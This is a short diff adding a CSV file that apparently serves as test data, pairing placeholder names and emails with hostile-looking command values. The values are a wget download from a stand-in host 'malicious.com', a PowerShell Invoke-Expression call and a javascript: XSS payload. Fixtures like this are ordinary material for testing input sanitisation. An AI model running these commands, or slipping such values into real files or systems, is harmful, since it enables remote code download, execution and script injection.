@@ -1,0 +1,4 @@
+Name,Email,Command
+John Doe,john@example.com,wget http://malicious.com/script.sh
+Jane Smith,jane@example.com,Invoke-Expression "dangerous_code"
+Bob Wilson,bob@example.com,javascript:alert('xss')
